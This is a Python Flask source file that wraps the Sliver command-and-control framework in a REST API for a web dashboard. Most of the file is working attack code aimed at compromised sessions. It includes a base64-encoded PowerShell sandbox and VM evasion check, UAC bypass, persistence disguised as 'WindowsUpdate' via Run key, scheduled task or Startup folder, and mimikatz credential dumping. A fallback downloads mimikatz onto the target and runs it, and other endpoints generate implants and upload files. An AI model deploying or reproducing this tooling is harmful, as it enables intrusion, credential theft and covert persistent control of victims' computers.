"""
rest_api_gateway.py - RESTful API 网关
将 Sliver 功能封装为 RESTful 接口，供 Web 页面调用
"""

import json
import subprocess
import sys
import os
import re
import base64
import tempfile
import atexit
import time
import threading
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS


app = Flask(__name__, static_folder=".")
CORS(app, resources={r"/api/*": {"origins": "*"}})  # 允许所有来源跨域请求

# ===== Sliver CLI 交互（优化版） =====

# 全局锁，防止多个命令同时执行导致冲突
sliver_lock = threading.Lock()

def _clean_and_decode(raw_bytes: bytes) -> str:
    """在二进制层面清理 ANSI 和 spinner，再用 GBK 解码。

    sliver-client 输出是混合编码：自身 spinner 是 UTF-8 盲文字符，
    而 schtasks 等命令的中文输出是 GBK。必须在解码前清理。
    """
    if not raw_bytes:
        return ""
    # 移除 ANSI CSI 序列 (ESC [ ... 字母)
    raw = re.sub(rb'\x1b\[[0-9;]*[a-zA-Z]', b'', raw_bytes)
    # 移除 ANSI OSC 序列 (ESC ] ... BEL 或 ST)
    raw = re.sub(rb'\x1b\][0-9;]*[^\x1b]*\x1b\\', b'', raw)
    # 移除盲文 spinner 字符（UTF-8: E2 A0 80-BF），这些是 sliver-client 连接动画
    raw = re.sub(rb'\xe2\xa0[\x80-\xbf]', b'', raw)
    # \r 替换为 \n
    raw = raw.replace(b'\r', b'\n')
    try:
        return raw.decode('gbk')
    except UnicodeDecodeError:
        return raw.decode('utf-8', errors='replace')


def run_sliver_command(commands: str, timeout: int = 180) -> str:
    """通过 Sliver CLI 执行命令，返回清理后的文本输出。"""
    with sliver_lock:
        rc_file = os.path.join(tempfile.gettempdir(), "sliver_rc_commands.txt")
        with open(rc_file, "w", encoding="ascii") as f:
            f.write(commands + "\nexit")

        cmd = f'.\\sliver-client.exe console --rc "{rc_file}"'

        last_error = ""
        output = ""
        for attempt in range(3):
            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True,
                    timeout=timeout, cwd="d:\\sliver"
                )
                output = _clean_and_decode(result.stdout) + _clean_and_decode(result.stderr)
                if "connection refused" not in output.lower() and "could not connect" not in output.lower():
                    break
                last_error = output
                time.sleep(2)
            except subprocess.TimeoutExpired as e:
                last_error = f"[TIMEOUT] Command timed out after {timeout}s\n{_clean_and_decode(e.stdout or b'')}\n{_clean_and_decode(e.stderr or b'')}"
                time.sleep(2)

        try:
            os.remove(rc_file)
        except:
            pass

        if attempt == 2 and last_error and not output:
            with open("d:\\sliver\\api_gateway_err.log", "a", encoding="utf-8") as f:
                f.write(f"[CMD] Failed after retries: {commands[:100]}\n{last_error[:500]}\n")
            return last_error

        # 过滤连接动画行和进度行，合并相邻重复行（\r 覆盖产生的冗余）
        spinner_chars = set('|/-\\')
        lines = output.split('\n')
        cleaned_lines = []
        for line in lines:
            stripped = line.strip()
            if not stripped:
                continue
            if stripped[0] in spinner_chars:
                continue
            # 合并相邻重复行（\r 刷新进度时每次覆盖产生一行）
            if cleaned_lines and cleaned_lines[-1] == line:
                continue
            cleaned_lines.append(line)
        output = '\n'.join(cleaned_lines)
        if len(output) > 2000:
            output = output[-2000:]
        return output


# ===== API 端点 =====

@app.route("/api/v1/status", methods=["GET"])
def status():
    """服务状态"""
    return jsonify({
        "status": "running",
        "version": "1.0.0",
        "server": "Sliver C2 REST API Gateway"
    })


@app.route("/api/v1/sessions", methods=["GET"])
def list_sessions():
    """获取所有在线会话"""
    output = run_sliver_command("sessions")
    
    # 调试：将原始输出写入日志
    with open("d:\\sliver\\sessions_debug.log", "w", encoding="utf-8") as f:
        f.write(output)
    
    sessions = []
    for line in output.split('\n'):
        # 去除 ANSI 转义码（颜色控制字符）
        clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line).strip()
        # 跳过连接中的 spinner 行（| / - \ 开头）
        if clean_line.startswith(('|', '/', '-', '\\')):
            continue
        # 跳过空行和表头
        if not clean_line or 'ID' in clean_line or '==' in clean_line:
            continue
        # 匹配带方括号的 [ALIVE] 状态
        if '[ALIVE]' in clean_line:
            parts = clean_line.split()
            if len(parts) >= 10:
                # 判断第一列是否为有效的 session ID（8位十六进制）
                # 如果不是，说明该行缺少 Name 列，第一列实际上是 RemoteAddr
                first_col = parts[0]
                is_valid_id = bool(re.match(r'^[0-9a-f]{8}$', first_col))
                
                if is_valid_id:
                    # 标准格式: ID(0) Name(1) Transport(2) RemoteAddr(3) Hostname(4) Username(5) ...
                    session = {
                        "id": parts[0],
                        "name": parts[1],
                        "transport": parts[2],
                        "remote_addr": parts[3],
                        "hostname": parts[4],
                        "username": parts[5],
                        "health": "alive",
                    }
                    start_idx = 6
                else:
                    # 缺少 Name 列的格式: RemoteAddr(0) Hostname(1) Username(2) Process(PID)(3-4) ...
                    # 第一列是 RemoteAddr（如 76.103:21530），Name 为空
                    session = {
                        "id": "",  # 没有有效的 ID，跳过此会话
                        "name": "",
                        "transport": "",
                        "remote_addr": first_col,
                        "hostname": parts[1] if len(parts) > 1 else "",
                        "username": parts[2] if len(parts) > 2 else "",
                        "health": "alive",
                    }
                    start_idx = 3
                
                # 提取进程名和 PID：从 start_idx 开始拼接到找到 (数字)
                process_parts = []
                pid = ""
                idx = start_idx
                for p in parts[start_idx:]:
                    if p.startswith('(') and p.endswith(')'):
                        pid = p.strip('()')
                        break
                    process_parts.append(p)
                    idx += 1
                session["process"] = ' '.join(process_parts)
                session["pid"] = pid
                # OS 和 Locale 在 PID 之后固定位置
                session["os"] = parts[idx + 1] if idx + 1 < len(parts) else ""
                session["locale"] = parts[idx + 2] if idx + 2 < len(parts) else ""
                
                # 只添加有有效 ID 的会话
                if session["id"]:
                    sessions.append(session)
    return jsonify({"sessions": sessions, "total": len(sessions)})


@app.route("/api/v1/implants", methods=["GET"])
def list_implants():
    """获取所有 Implant 配置"""
    output = run_sliver_command("implants")
    implants = []
    for line in output.split('\n'):
        if 'windows/' in line or 'linux/' in line:
            parts = line.split()
            if len(parts) >= 6:
                implants.append({
                    "name": parts[0],
                    "type": parts[1],
                    "os_arch": parts[3],
                    "format": parts[4],
                    "id": parts[6],
                })
    return jsonify({"implants": implants, "total": len(implants)})


@app.errorhandler(500)
def handle_500(e):
    """捕获 500 错误并返回 JSON"""
    import traceback
    error_msg = traceback.format_exc()
    with open("d:\\sliver\\api_gateway_err.log", "a", encoding="utf-8") as f:
        f.write(f"[500 ERROR] {error_msg}\n")
    return jsonify({"error": "服务器内部错误", "detail": str(e)}), 500

@app.route("/api/v1/sandbox-detect", methods=["POST"])
def sandbox_detect():
    """执行沙箱检测"""
    data = request.get_json() or {}
    session_id = data.get("session_id", "")

    if not session_id:
        return jsonify({"error": "缺少 session_id"}), 400

    # 先检查会话是否存在以及 OS 类型
    sessions_output = run_sliver_command("sessions")
    session_found = False
    is_linux = False
    for line in sessions_output.split('\n'):
        clean_line = re.sub(r'\x1b\[[0-9;]*m', '', line).strip()
        if session_id in clean_line and '[ALIVE]' in clean_line:
            session_found = True
            if 'linux/' in clean_line:
                is_linux = True
            break
    
    if not session_found:
        return jsonify({"error": f"会话 {session_id} 未找到或不在线"}), 404
    
    if is_linux:
        return jsonify({
            "error": f"当前会话为 Linux 系统，但 sandbox-detect 扩展仅支持 Windows (sandbox_detect.dll)",
            "vm_detected": False,
            "sandbox_detected": False,
            "debugger_detected": False,
            "hint": "请使用 Windows 目标会话执行沙箱检测"
        }), 400

    # 使用 spawndll 执行 sandbox_detect.dll 扩展
    # 扩展已安装在 ~/.sliver-client/extensions/sandbox-detect/
    dll_path = os.path.expanduser("~/.sliver-client/extensions/sandbox-detect/sandbox_detect.dll")
    dll_path = dll_path.replace("\\", "/")
    commands = f"use {session_id}\nspawndll --export go {dll_path}"
    output = run_sliver_command(commands)

    # 检查 spawndll 是否成功
    if "Error" not in output and "error" not in output.lower():
        try:
            json_start = output.find('{"')
            if json_start >= 0:
                depth = 0
                json_end = json_start
                for i in range(json_start, len(output)):
                    if output[i] == '{':
                        depth += 1
                    elif output[i] == '}':
                        depth -= 1
                        if depth == 0:
                            json_end = i + 1
                            break
                if json_end > json_start:
                    result = json.loads(output[json_start:json_end])
                    return jsonify(result)
        except:
            pass

    # 如果 spawndll 执行失败或没有输出，使用 PowerShell 脚本在目标上执行沙箱检测
    ps_script = '''
$results = @{
    vm_detected = $false
    sandbox_detected = $false
    debugger_detected = $false
    details = @{}
}

# 1. 虚拟机检测 - MAC 地址
$adapters = Get-NetAdapter | Where-Object {$_.Status -eq "Up"}
foreach ($adapter in $adapters) {
    $mac = $adapter.MacAddress
    if ($mac -match "^00:05:69|^00:0C:29|^00:1C:14|^00:50:56") {
        $results.vm_detected = $true
        $results.details.vm_mac = "VMware ($mac)"
    } elseif ($mac -match "^08:00:27") {
        $results.vm_detected = $true
        $results.details.vm_mac = "VirtualBox ($mac)"
    } elseif ($mac -match "^00:15:5D|^00:03:FF") {
        $results.vm_detected = $true
        $results.details.vm_mac = "Hyper-V ($mac)"
    } elseif ($mac -match "^00:1C:42") {
        $results.vm_detected = $true
        $results.details.vm_mac = "Parallels ($mac)"
    } elseif ($mac -match "^00:0F:4B") {
        $results.vm_detected = $true
        $results.details.vm_mac = "QEMU ($mac)"
    } elseif ($mac -match "^00:16:3E") {
        $results.vm_detected = $true
        $results.details.vm_mac = "Xen ($mac)"
    }
}

# 2. 虚拟机检测 - 进程
$vmProcesses = @{
    "vmtoolsd.exe" = "VMware"; "vmwaretray.exe" = "VMware"; "vmwareuser.exe" = "VMware"
    "VBoxService.exe" = "VirtualBox"; "VBoxTray.exe" = "VirtualBox"
    "xenservice.exe" = "Xen"; "prl_cc.exe" = "Parallels"; "prl_tools.exe" = "Parallels"
    "qemu-ga.exe" = "QEMU"
}
$running = Get-Process
foreach ($proc in $vmProcesses.Keys) {
    if ($running.Name -like ($proc -replace '.exe','')) {
        $results.vm_detected = $true
        $results.details.vm_process = $vmProcesses[$proc]
    }
}

# 3. 沙箱检测 - 进程
$sandboxProcesses = @("sniffer", "joeboxcontrol", "joeboxserver", "cwsandbox", "wireshark", "procmon", "procmon64", "regmon", "dumpcap", "dbgview", "httpdebuggerui")
foreach ($proc in $sandboxProcesses) {
    if ($running.Name -like $proc) {
        $results.sandbox_detected = $true
        $results.details.sandbox_process = $proc
    }
}

# 4. 调试器检测
try {
    $isDebugged = [System.Diagnostics.Debugger]::IsAttached
    if ($isDebugged) { $results.debugger_detected = $true; $results.details.debugger = "IsDebuggerPresent" }
} catch {}

# 5. 桌面文件数量检测
$desktopFiles = (Get-ChildItem "$env:USERPROFILE\\Desktop" -ErrorAction SilentlyContinue).Count
if ($desktopFiles -lt 5) {
    $results.details.desktop_files = $desktopFiles
}

# 6. 注册表检测
$vmRegKeys = @(
    "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\vmx86",
    "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
    "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\vmicheartbeat"
)
foreach ($key in $vmRegKeys) {
    if (Test-Path $key) {
        $results.vm_detected = $true
        $results.details.vm_registry = $key
    }
}

$results | ConvertTo-Json -Compress
'''
    
    # 将 PowerShell 脚本 Base64 编码，内联到命令中（目标机器上不存在本地文件）
    ps_b64 = base64.b64encode(ps_script.encode('utf-16le')).decode('ascii')
    ps_cmd = f"powershell -ExecutionPolicy Bypass -EncodedCommand {ps_b64}"
    exec_commands = f"use {session_id}\nexecute -o -- {ps_cmd}"
    exec_output = run_sliver_command(exec_commands, timeout=180)

    # 从输出中提取 JSON（在 "[*] Output:" 之后找第一个完整的 JSON 对象）
    try:
        json_start = exec_output.find('{"')
        if json_start >= 0:
            # 从 { 开始找匹配的 }
            depth = 0
            json_end = json_start
            for i in range(json_start, len(exec_output)):
                if exec_output[i] == '{':
                    depth += 1
                elif exec_output[i] == '}':
                    depth -= 1
                    if depth == 0:
                        json_end = i + 1
                        break
            if json_end > json_start:
                json_str = exec_output[json_start:json_end]
                result = json.loads(json_str)
                return jsonify(result)
    except:
        pass

    return jsonify({
        "raw_output": output[:1000] + "\n---\n" + exec_output[:1000],
        "vm_detected": False,
        "sandbox_detected": False,
        "debugger_detected": False,
        "note": "扩展加载失败，已尝试通过 PowerShell 执行检测"
    })


@app.route("/api/v1/bypass-uac", methods=["POST"])
def bypass_uac():
    """执行 Bypass UAC 提权"""
    data = request.get_json() or {}
    session_id = data.get("session_id", "")
    method = data.get("method", "comhijack")

    if not session_id:
        return jsonify({"error": "缺少 session_id"}), 400

    commands = f"use {session_id}\nbypass-uac -m {method}"
    output = run_sliver_command(commands)

    return jsonify({
        "success": "success" in output.lower() or "elevated" in output.lower(),
        "method": method,
        "output": output[:500],
    })


@app.route("/api/v1/persist", methods=["POST"])
def install_persistence():
    """安装持久化
    
    Sliver 没有内置的 persist 命令，使用实际支持的命令实现三种持久化方式：
    
    1. reg - 注册表持久化: 使用 registry write 写入 HKCU\...\Run 键
    2. schtask - 计划任务: 使用 execute 执行 schtasks /create
    3. startup - 启动文件夹: 使用 upload 上传文件到 Startup 目录
    """
    data = request.get_json() or {}
    session_id = data.get("session_id", "")
    method = data.get("method", "reg")
    name = data.get("name", "WindowsUpdate")
    target = data.get("target", "C:\\Users\\26234\\vm-windows-test.exe").replace("/", "\\")

    if not session_id:
        return jsonify({"error": "缺少 session_id"}), 400

    if method == "reg":
        # 注册表持久化：使用 registry write 写入 Run 键
        # 注意：路径最后必须包含 key 名（代码中会把最后一个 \ 后面的部分当作 key 名）
        # 正确格式: registry write --hive HKCU --type string "Software\...\Run\KeyName" "value"
        reg_path = f"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{name}"
        commands = (
            f"use {session_id}\n"
            f"registry write --hive HKCU --type string \"{reg_path}\" \"{target}\""
        )
    elif method == "schtask":
        # 计划任务持久化：使用 execute 执行 schtasks /create
        # 每分钟执行一次
        schtask_cmd = (
            f'schtasks /create /sc minute /mo 1 /tn "{name}" /tr "{target}" /f'
        )
        commands = (
            f"use {session_id}\n"
            f"execute -o {schtask_cmd}"
        )
    elif method == "startup":
        # 启动文件夹持久化：先上传文件到目标，再复制到启动文件夹
        # 先检查目标文件是否存在，如果不存在则先上传
        # 获取当前会话的用户名
        sessions_output = run_sliver_command("sessions")
        username = "Administrator"
        for line in sessions_output.split('\n'):
            if session_id in line:
                parts = line.split()
                # username 通常是第6个字段
                try:
                    username = parts[5]
                except:
                    pass
                break
        startup_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        copy_cmd = (
            f'cmd /c copy /Y "{target}" "{startup_dir}\\{name}.exe"'
        )
        commands = (
            f"use {session_id}\n"
            f"execute -o {copy_cmd}"
        )
    else:
        return jsonify({"error": f"不支持的持久化方法: {method}，支持: reg, schtask, startup"}), 400

    output = run_sliver_command(commands)

    # 判断成功条件
    success = False
    if method == "reg":
        success = "written" in output.lower() or "value written" in output.lower()
    elif method == "schtask":
        success = "success" in output.lower() or "created" in output.lower() or "成功" in output
    elif method == "startup":
        success = ("copied" in output.lower() or "1 file" in output.lower()
                   or "已复制         1" in output or "复制了 1 个" in output)

    return jsonify({
        "success": success,
        "method": method,
        "name": name,
        "output": output[-500:] if len(output) > 500 else output,
    })


@app.route("/api/v1/credentials", methods=["POST"])
def dump_credentials():
    """抓取凭据"""
    data = request.get_json() or {}
    session_id = data.get("session_id", "")
    command = data.get("command", "sekurlsa::logonpasswords")

    if not session_id:
        return jsonify({"error": "缺少 session_id"}), 400

    # 方法1：尝试使用内置 mimikatz 命令
    commands = f"use {session_id}\nmimikatz \"{command}\""
    output = run_sliver_command(commands)

    # 如果内置命令失败，尝试方法2：使用 PowerShell 下载并执行 mimikatz
    if "unknown command" in output.lower():
        print("[*] 内置 mimikatz 不可用，尝试使用 PowerShell 执行...")
        # 注意：用 -- 分隔符防止 Sliver 的 flag 解析器干扰 PowerShell 的参数（如 -DestinationPath）
        # 同时用双引号包裹整个 -Command 参数，内部命令用单引号
        ps_command = f"powershell -ExecutionPolicy Bypass -Command \"(New-Object Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20230905/mimikatz_trunk.zip','C:\\Windows\\Temp\\m.zip');Expand-Archive C:\\Windows\\Temp\\m.zip -DestinationPath C:\\Windows\\Temp\\m -Force;C:\\Windows\\Temp\\m\\x64\\mimikatz.exe '{command}' exit\""
        commands = f"use {session_id}\nexecute -o -- {ps_command}"
        output = run_sliver_command(commands)

    return jsonify({
        "command": command,
        "output": output[:2000],
    })


@app.route("/api/v1/self-destruct", methods=["POST"])
def self_destruct():
    """自毁"""
    data = request.get_json() or {}
    session_id = data.get("session_id", "")

    if not session_id:
        return jsonify({"error": "缺少 session_id"}), 400

    commands = f"use {session_id}\nrm implant.exe\nexit"
    output = run_sliver_command(commands)

    return jsonify({
        "success": True,
        "output": output[:500],
    })


# ===== Implant 操作 API =====

@app.route("/api/v1/implant/download", methods=["POST"])
def download_implant():
    """下载 Implant 文件"""
    data = request.get_json() or {}
    name = data.get("name", "")

    if not name:
        return jsonify({"error": "缺少 name"}), 400

    # 查找 Implant 文件
    implant_dir = "."
    for f in os.listdir(implant_dir):
        if f.startswith(name) or f == name:
            filepath = os.path.join(implant_dir, f)
            if os.path.isfile(filepath):
                return send_from_directory(implant_dir, f, as_attachment=True)

    return jsonify({"error": f"未找到 Implant 文件: {name}"}), 404


@app.route("/api/v1/upload", methods=["POST"])
def upload_file():
    """上传文件到目标会话"""
    data = request.get_json() or {}
    session_id = data.get("session_id", "")
    local_path = data.get("local_path", "")
    remote_path = data.get("remote_path", "")

    if not session_id:
        return jsonify({"error": "缺少 session_id"}), 400
    if not local_path:
        return jsonify({"error": "缺少 local_path"}), 400
    if not remote_path:
        return jsonify({"error": "缺少 remote_path"}), 400

    if not os.path.isfile(local_path):
        return jsonify({"error": f"本地文件不存在: {local_path}"}), 400

    commands = f"use {session_id}\nupload \"{local_path}\" \"{remote_path}\""
    output = run_sliver_command(commands, timeout=300)

    return jsonify({
        "success": "successfully" in output.lower() or "wrote" in output.lower(),
        "local_path": local_path,
        "remote_path": remote_path,
        "output": output[-500:] if len(output) > 500 else output,
    })


@app.route("/api/v1/implant/delete", methods=["POST"])
def delete_implant():
    """删除 Implant 配置"""
    data = request.get_json() or {}
    name = data.get("name", "")

    if not name:
        return jsonify({"error": "缺少 name"}), 400

    commands = f"implants rm {name}"
    output = run_sliver_command(commands)

    return jsonify({
        "success": True,
        "name": name,
        "output": output[:500],
    })


@app.route("/api/v1/implant/generate", methods=["POST"])
def generate_implant():
    """生成新的 Implant"""
    data = request.get_json() or {}
    name = data.get("name", "myimplant")
    c2 = data.get("c2", "127.0.0.1:7777")
    format_type = data.get("format", "exe")
    os_type = data.get("os", "windows")

    # 构建生成命令
    cmd = f"generate --name {name} --os {os_type} --arch amd64 --format {format_type} --http {c2}"
    output = run_sliver_command(cmd)

    success = "success" in output.lower() or "generated" in output.lower()

    return jsonify({
        "success": success,
        "name": name,
        "output": output[:1000],
    })


# ===== 托管前端页面 =====

@app.route("/")
def index():
    """托管仪表盘页面"""
    return send_from_directory(".", "sliver-dashboard.html")


if __name__ == "__main__":
    print("[*] 启动 REST API 网关 (端口 5000)...")
    print("[*] 访问 http://127.0.0.1:5000/ 打开管理面板")
    print("[*] 热重载已启用：修改代码后自动重启，无需手动操作")
    # 启用 debug=True 开启热重载，修改代码后 Flask 自动重启
    # 注意：debug=True 时 Flask 会启动两个进程，子进程会重新加载代码
    # 如果遇到端口占用问题，可以改为 debug=False
    app.run(host="0.0.0.0", port=5000, debug=True)
